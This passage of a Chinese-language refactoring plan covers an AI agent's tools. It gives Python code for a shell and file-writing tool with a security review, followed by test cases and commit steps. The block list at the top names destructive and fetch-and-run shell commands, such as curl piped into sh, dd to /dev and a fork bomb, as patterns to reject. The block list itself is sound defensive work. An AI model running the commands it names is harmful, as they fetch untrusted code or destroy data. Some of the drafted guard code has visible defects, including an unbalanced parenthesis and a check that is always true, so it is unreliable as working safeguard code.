    re.compile(r"\bdd\b[^\n]*\bof=/dev/", re.I),
    re.compile(r":\(\)\s*{", re.I),                      # fork 炸弹头部
    re.compile(r"\bshutdown\b|\breboot\b|\bpoweroff\b", re.I),
    re.compile(r"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba)?sh", re.I),  # 管道执行
    re.compile(r"\b>\s*/dev/[a-z]", re.I),
    re.compile(r"\bchmod\s+(-R\s+)?777\s+/(\s|$)", re.I),
]

CONFIRM_PATTERNS: list[re.Pattern] = [
    re.compile(r"\bgit\s+push\s+--force|\bgit\s+push\s+-f\b", re.I),
    re.compile(r"\bnpm\s+publish\b", re.I),
    re.compile(r"\bdocker\s+(rm|rmi)\b", re.I),
    re.compile(r"\bsudo\b", re.I),
    re.compile(r">\s*/etc/|/usr/bin/|/boot/", re.I),
]

PROTECTED_PATH_PATTERNS: list[str] = [
    "thumbelina.db", "MEMORY/", "prompts/roles/", "plugins/", ".env",
]

_ERROR_HINTS = re.compile(
    r"\berror\b|denied|not found|Traceback|command not found", re.I
)


def _normalize_command(command: str) -> str:
    lines = [ln.split("#", 1)[0] for ln in command.splitlines()]
    return re.sub(r"\s+", " ", " ".join(lines)).strip()


class ExecutionTool(ThumbelinaBaseTool):
    category: ToolCategory = ToolCategory.EXECUTION

    @abstractmethod
    async def security_review(self, args: dict[str, Any]) -> Allow | Confirm | Reject:
        """执行工具必须实现真实审查。"""

    @abstractmethod
    async def self_verify(self, args: dict[str, Any], result: str) -> Ok | Suspect:
        """执行工具必须实现真实自验证。"""

    security_review.__isabstractmethod__ = True  # 覆盖基类默认,强制子类实现
    self_verify.__isabstractmethod__ = True


class RunShellTool(ExecutionTool):
    name: str = "run_shell"
    description: str = (
        "Execute a shell command and return stdout+stderr. Timeout: 30 seconds."
    )

    async def security_review(self, args: dict[str, Any]) -> Allow | Confirm | Reject:
        cmd = _normalize_command(str(args.get("command", "")))
        if not cmd:
            return Reject("空命令")
        for pat in DANGEROUS_PATTERNS:
            if pat.search(cmd):
                return Reject(f"危险命令模式 {pat.pattern!r}")
        for pat in CONFIRM_PATTERNS:
            if pat.search(cmd):
                return Confirm(f"建议人工确认: {pat.pattern!r}")
        return Allow()

    async def _execute(self, command: str) -> str:
        cwd = get_workspace() or os.getcwd()
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            shell=True,
            cwd=cwd,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=_TIMEOUT)
        except asyncio.TimeoutError:
            proc.kill()
            return f"Error: Command timed out after {_TIMEOUT} seconds"
        output = stdout.decode("utf-8", errors="replace") if stdout else ""
        if len(output) > 100_000:
            output = output[:100_000] + "\n... (truncated)"
        return output + f"\n[exit code: {proc.returncode}]"

    async def self_verify(self, args: dict[str, Any], result: str) -> Ok | Suspect:
        m = re.search(r"\[exit code: (-?\d+)\]", result)
        if m and m.group(1) != "0":
            if _ERROR_HINTS.search(result) or m.group(1) not in ("",):
                return Suspect(f"命令退出码非零: {m.group(1)}")
        return Ok()


class WriteFileTool(ExecutionTool):
    name: str = "write_file"
    description: str = "Write content to a file. Creates parent directories if needed."
    _content_hint: str = Field(default="", exclude=True)

    async def security_review(self, args: dict[str, Any]) -> Allow | Confirm | Reject:
        raw = str(args.get("path", ""))
        try:
            resolved = resolve_workspace_path(raw)
        except ValueError as exc:
            return Reject(str(exc))
        base = Path(resolved if resolved is not None else raw)
        posix = str(base).replace("\\", "/")
        ws = get_workspace()
        rel = posix
        if ws:
            try:
                rel = str(Path(ws).resolve().relative_to(Path(ws).resolve())) or posix
            except ValueError:
                rel = posix
        for guard in PROTECTED_PATH_PATTERNS:
            g = guard.replace("/", "")
            if posix.endswith(guard.rstrip("/")) or posix.endswith("/" + guard) or (
                "/" + guard) in posix or posix.startswith(guard) or g in posix
            ):
                return Reject(f"受保护路径: {guard}")
        return Allow()

    async def _execute(self, path: str, content: str) -> str:
        try:
            resolved = resolve_workspace_path(path)
            p = Path(resolved) if resolved is not None else Path(path).resolve()
        except ValueError as exc:
            return f"Error: {exc}"
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content, encoding="utf-8")
            self._content_hint = content
            return f"Successfully wrote {len(content)} bytes to {path}"
        except PermissionError:
            return f"Error: Permission denied: {path}"
        except OSError as exc:
            return f"Error writing file: {exc}"

    async def self_verify(self, args: dict[str, Any], result: str) -> Ok | Suspect:
        if not result.startswith("Successfully wrote"):
            return Ok()  # 已在 _execute 中返回 Error:,无副作用可验证
        content = str(args.get("content", ""))
        try:
            resolved = resolve_workspace_path(str(args.get("path", "")))
            p = Path(resolved) if resolved is not None else Path(str(args.get("path", ""))).resolve()
            actual = p.stat().st_size
        except OSError:
            return Suspect("写入后无法回读校验")
        if actual != len(content.encode("utf-8")):
            return Suspect("写入字节数与内容不符")
        return Ok()
```

注意：`ExecutionTool` 中「重声明为抽象」的写法若被 pydantic/BaseTool 元类拒绝（langchain BaseTool 非 ABC），退而求其次：基类默认实现改为 `raise NotImplementedError` 并文档化「执行子类必须覆写」，测试用 `pytest.raises(NotImplementedError)`。实现时以 `uv run python -c "from thumbelina.tools.execution import ExecutionTool"` 冒烟决定采用哪种。

- [ ] **Step 4: 运行测试**

Run: `uv run pytest tests/test_tools/test_execution_review.py tests/test_tools/test_shell.py -q`
Expected: 全 PASS；`test_shell.py` 内旧用例若断言超时/截断文案，行为不变应通过；若因新增审查改变个别用例输入（如旧测试用 `rm` 类命令），改用 `ls` 等中性命令重写。

- [ ] **Step 5: 删除 shell.py / file_ops.py，更新 `tools/__init__.py` 与 `tests/test_tools/test_file_ops.py` import 指向 `execution.WriteFileTool`**

- [ ] **Step 6: 提交**

```bash
git add -A src/thumbelina/tools tests/test_tools
git commit -m "feat: 执行工具安全审查与结果自验证(run_shell/write_file)落地"
```

---

### Task 5: 用户沟通 + 技能编组工具迁移

**Files:**
- Create: `src/thumbelina/tools/communication.py`、`src/thumbelina/tools/execution_skill.py`
- Test: `tests/test_tools/test_communication.py`、`tests/test_tools/test_execution_skill.py`
- Modify: `src/thumbelina/agent/graph.py:300-412`（删 `_make_composition_tools`、`_make_channel_tools`；装配段 L550-552 改调新函数）

**Interfaces:**
- Consumes: `ThumbelinaBaseTool`/`ExecutionTool`（Task 4）、`agent.get_channel/list_channels`、`channel.send_message`、`CompositionEngine.create_composition/match_composition/execute_composition/composition_repo`
- Produces: `make_communication_tools(agent_ref) -> list[BaseTool]`；`make_skill_tools(engine) -> list[BaseTool]`；类 `NotifyUserByChannelTool`、`CreateSkillCompositionTool`、`ListSkillCompositionsTool`、`ExecuteSkillCompositionTool`

- [ ] **Step 1: `tests/test_tools/test_communication.py`**

```python
from __future__ import annotations

import pytest

from thumbelina.tools.base import ToolCategory
from thumbelina.tools.communication import (
    CommunicationTool,
    NotifyUserByChannelTool,
    make_communication_tools,
)


class FakeChannel:
    def __init__(self, last_user_id="u9", result="ok"):
        self.last_user_id, self.result, self.sent = last_user_id, result, None

    async def send_message(self, target, message):
        self.sent = (target, message)
        return self.result


class FakeAgent:
    def __init__(self, channel):
        self.channel = channel

    def get_channel(self, name):
        return self.channel if name == "wechat" else None

    def list_channels(self):
        return ["wechat"] if self.channel else []


@pytest.mark.asyncio
async def test_notify_falls_back_to_last_user():
    ch = FakeChannel()
    t = NotifyUserByChannelTool(agent_ref=FakeAgent(ch))
    out = await t._arun(message="hi")
    assert ch.sent == ("u9", "hi")
    assert "Message sent to user 'u9'" in out


@pytest.mark.asyncio
async def test_notify_unknown_channel_lists_available():
    t = NotifyUserByChannelTool(agent_ref=FakeAgent(FakeChannel()))
    out = await t._arun(message="hi", channel="qq")
    assert "Available channels: wechat" in out


@pytest.mark.asyncio
async def test_notify_no_recipient():
    t = NotifyUserByChannelTool(agent_ref=FakeAgent(FakeChannel(last_user_id=None)))
    out = await t._arun(message="hi")
    assert "no recent user" in out


@pytest.mark.asyncio
async def test_receipt_unconfirmed_when_none():
    ch = FakeChannel(result=None)
    t = NotifyUserByChannelTool(agent_ref=FakeAgent(ch))
    out = await t._arun(message="hi", user_id="u1")
    assert "delivery not confirmed" in out


def test_category_and_factory():
    assert NotifyUserByChannelTool().category == ToolCategory.COMMUNICATION
    assert len(make_communication_tools(FakeAgent(FakeChannel()))) == 1
```

- [ ] **Step 2: 实现 `communication.py`**（`resolve_target`/`format_receipt` 契约方法；函数体搬 `graph.py:378-410`，行为逐字保留）

```python
"""用户沟通工具:向人主动发消息(spec §4.3)。"""
from __future__ import annotations

from typing import Any

from langchain_core.tools import BaseTool

from thumbelina.tools.base import ThumbelinaBaseTool, ToolCategory


class CommunicationTool(ThumbelinaBaseTool):
    category: ToolCategory = ToolCategory.COMMUNICATION
    agent_ref: Any = None

    def resolve_target(self, channel_name: str, user_id: str) -> tuple[Any, str, str | None]:
        """返回 (channel|None, target|None, error_message|None)。"""
        ch = self.agent_ref.get_channel(channel_name)
        if ch is None:
            available = ", ".join(sorted(self.agent_ref.list_channels())) or "none"
            return None, "", f"Channel '{channel_name}' is not registered. Available channels: {available}."
        target = user_id.strip() or getattr(ch, "last_user_id", None)
        if not target:
            return None, "", (
                f"Channel '{channel_name}' has no recent user to notify; "
                "provide an explicit user_id."
            )
        return ch, target, None

    @staticmethod
    def format_receipt(channel: str, target: str, delivered: Any, exc: Any = None) -> str:
        if exc is not None:
            return f"Failed to send message via '{channel}': {exc}"
        if delivered is None:
            return (
                f"Message handed to channel '{channel}' for user '{target}'; "
                "delivery not confirmed."
            )
        return f"Message sent to user '{target}' via channel '{channel}'."


class NotifyUserByChannelTool(CommunicationTool):
    name: str = "notify_user_by_channel"
    description: str = (
        "Send a proactive message to a user via an IM channel.\n\n"
        "Use this to notify the user (task completion, reminders, follow-ups)\n"
        "instead of only replying in the current conversation. Defaults to the\n"
        "WeChat channel and to that channel's most recent user.\n\n"
        "Args:\n"
        "    message: The message text to send.\n"
        "    channel: Channel name, e.g. \"wechat\" or \"qq\". Defaults to \"wechat\".\n"
        "    user_id: Target user ID. If empty, the channel's most recent user\n"
        "        is used."
    )

    async def _execute(
        self, message: str, channel: str = "wechat", user_id: str = ""
    ) -> str:
        ch, target, err = self.resolve_target(channel, user_id)
        if err:
            return err
        try:
            result = await ch.send_message(target, message)
        except Exception as exc:  # noqa: BLE001
            return self.format_receipt(channel, target, None, exc=exc)
        return self.format_receipt(channel, target, result)


def make_communication_tools(agent_ref: Any) -> list[BaseTool]:
    return [NotifyUserByChannelTool(agent_ref=agent_ref)]
```

- [ ] **Step 3: `tests/test_tools/test_execution_skill.py` + 实现 `execution_skill.py`**

测试覆盖：`create_skill_composition("a, b", ...)` 返回含 `Composition created with ID`；空 `skill_ids` 返回 `"No skill IDs provided."`；engine 抛异常返回 `Failed to create composition:`；`execute_skill_composition` 无匹配返回 `"No matching composition found for the input."`，有匹配返回 result；`execute` 返回空串时末尾含 `[warn]`；`list` 空列表返回 `"No skill compositions found."`。三类的 review 全部 pass（继承 ExecutionTool 但 `security_review` 返回 `Allow()`——技能编排无外部危险面），`ExecuteSkillCompositionTool.self_verify` 实现 spec §5.3 空串规则。函数体搬 `graph.py:314-358` 原样。`make_skill_tools(engine)` 返回三实例。

- [ ] **Step 4: 接线 `graph.py`**：删 `_make_composition_tools`（L300-358）、`_make_channel_tools`（L361-412）；装配段改 `self.tools.extend(make_skill_tools(self.composition_engine))`（仅 engine 非 None）、`self.tools.extend(make_communication_tools(self))`。imports 更新。

- [ ] **Step 5: 运行测试**

Run: `uv run pytest tests/test_tools/test_communication.py tests/test_tools/test_execution_skill.py tests/test_agent -q`
Expected: 全 PASS

- [ ] **Step 6: 提交**

```bash
git add -A src/thumbelina/tools src/thumbelina/agent/graph.py tests/test_tools
git commit -m "refactor: 用户沟通与技能编组工具迁入分类体系"
```

---

### Task 6: remember 迁入执行类 + memory/tools.py 收口

**Files:**
- Modify: `src/thumbelina/tools/execution.py`（追加 `RememberTool`，继承 `ExecutionTool`）、`src/thumbelina/memory/tools.py`（删三个类定义，保留 `make_memory_tools` 改 import）
- Test: `tests/test_tools/test_execution_review.py` 追加 `RememberTool` 用例；`tests/test_memory/` 现有测试全绿为门禁

**Interfaces:**
- Consumes: `ExecutionTool`、`MemoryService`、`MemoryExtractor`、`search_entries`、`DEFAULT_USER_ID`
- Produces: `RememberTool`（迁入 `thumbelina.tools.execution`，同名同参同配额语义）；`make_memory_tools` 签名不变
- ⚠️ `graph.py:576-578` 的 `from thumbelina.memory.tools import RememberTool` 必须同步改 `from thumbelina.tools.execution import RememberTool`（`memory.tools` 继续 re-export 同名符号兜底，两处 import 都可用）

- [ ] **Step 1: 在 `test_execution_review.py` 追加失败测试**：假 extractor/service → `_arun(remember_fact=...)` 返回「已记下(新建 ...)/已更新/已删除/无需记录」四文案；配额 ≥3 返回上限提示且不调 extractor；`self_verify` 对 NOOP 返回 Ok（不报警）。
- [ ] **Step 2: 确认失败** Run: `uv run pytest tests/test_tools/test_execution_review.py -q` Expected: ImportError RememberTool
- [ ] **Step 3: 实现**：`memory/tools.py` 三类的 `_arun` 逻辑拆入 `RememberTool`（继承 `ExecutionTool`）：配额检查+`extractor.extract_from_messages` 搬入 `_execute`；`security_review` 返回 `Allow()`；`self_verify`：decision∈{NEW,UPDATE,DELETE}→Ok，NOOP→Ok（说明文案已在 _execute 返回，不追加 warn）。`SearchMemoryTool`/`ReadMemoryTool` 迁入 `perception.py`（`PerceptionTool` 子类，`_arun`→`_execute` 签名一致）。`memory/tools.py` 重写为：

```python
"""记忆工具组装出口(类定义已迁入 thumbelina.tools 分类体系)。"""
from __future__ import annotations

from langchain_core.tools import BaseTool

from thumbelina.memory.extractor import MemoryExtractor
from thumbelina.memory.service import MemoryService
from thumbelina.tools.execution import RememberTool
from thumbelina.tools.perception import ReadMemoryTool, SearchMemoryTool

__all__ = ["RememberTool", "SearchMemoryTool", "ReadMemoryTool", "make_memory_tools"]
# make_memory_tools 原样保留(仅 __init__ 改 import)
```

`graph.py` 的 `RememberTool` import 改自 `thumbelina.tools.execution`。
- [ ] **Step 4:** Run: `uv run pytest tests/test_tools tests/test_memory tests/test_agent -q` → 全 PASS
- [ ] **Step 5:** `git add -A && git commit -m "refactor: remember 并入执行体系,记忆检索并入感知体系"`

---

### Task 7: 收口——get_all_tools 聚合 + 全量回归

**Files:**
- Modify: `src/thumbelina/tools/__init__.py`（重写聚合；删除对旧模块的 import）
- Test: `tests/test_tools/test_registry.py`（新建）

- [ ] **Step 1: 写回归测试**

```python
"""get_all_tools 名称集合回归: 与重构前逐字一致(spec §7)。"""
from __future__ import annotations

from thumbelina.tools import get_all_tools

EXPECTED = {
    "read_file", "write_file", "list_directory", "search_files",
    "fetch_url", "run_shell", "parse_json", "parse_csv",
    "analyze_text", "search_text",
}


def test_names_stable():
    assert {t.name for t in get_all_tools()} == EXPECTED


def test_web_search_gated():
    class _Cfg:
        class web_search:  # noqa: N801
            enabled = True
            provider = "duckduckgo"
            api_key = ""

    names = {t.name for t in get_all_tools(_Cfg())}
    assert "web_search" in names


def test_categories_assigned():
    from thumbelina.tools.base import ToolCategory

    for t in get_all_tools():
        assert isinstance(t.category, ToolCategory)
```

- [ ] **Step 2: 实现 `__init__.py`**：`get_all_tools(search_config=None)` 返回 `perception_tools(search_config) + [WriteFileTool(), RunShellTool()]`；`__all__` 更新。`tests/test_main.py` 或 `api`/`cli` 若有直接 import 旧工具函数名（`from thumbelina.tools import read_file`），grep `from thumbelina.tools import` 确认无外部消费旧符号；有则改类实例或保留兼容别名（决定：不留别名，旧符号全部内部化，grep 结果驱动改动）。

```bash
grep -rn "from thumbelina.tools import\|from thumbelina.tools\." src tests frontend 2>/dev/null | grep -v __pycache__
```

- [ ] **Step 3: 全量后端测试** Run: `uv run pytest -q` Expected: 全 PASS
- [ ] **Step 4: 前端冒烟**（工具卡片走 trajectory 数据，分类改动不影响 schema——跑 `cd frontend && npm test` 确认既有绿；无需改动）
- [ ] **Step 5: README 更新**：README/README_CN 的 Built-in Tools 行补一句「工具按感知/执行/用户沟通/协作/事件触发五类组织，执行类带安全审查与结果自验证」。
- [ ] **Step 6: 提交**

```bash
git add -A
git commit -m "refactor: get_all_tools 按五类聚合,tools 分类重构收口"
```

---

## Self-Review（计划对照 spec）

- spec §2 分类 22 个：Task 2（9 个内置感知）、Task 6（2 个 memory 感知迁入）、Task 4（2 执行）、Task 6（remember）、Task 5（3 技能 +1 沟通）、Task 3（2 协作 +2 事件）、Task 7（web_search 经 config 门控）。✔
- spec §4.3 契约：`report_status`（Task 3）、`resolve_target/format_receipt`（Task 5）、`parse_trigger`+TimeParser 注入（Task 3）、`ExecutionTool` 强制抽象（Task 4，含退路）、`TaskTool` 强类型签名说明（Task 3 注意事项）。✔
- spec §5 审查/验证规则：全在 Task 4。✔ §5.3 verify 各工具：Task 3/4/5/6 各自落位。✔
- spec §6 装配：graph.py 工厂删除分散在 Task 3/5，`__init__.py` 在 Task 7。✔ §7 测试：每任务自带；名称回归在 Task 7。✔
- 类型一致性：`security_review(args: dict) / self_verify(args, result) / _execute(**kwargs)` 签名全文一致；`Allow/Confirm/Reject/Ok/Suspect` 命名一致。✔
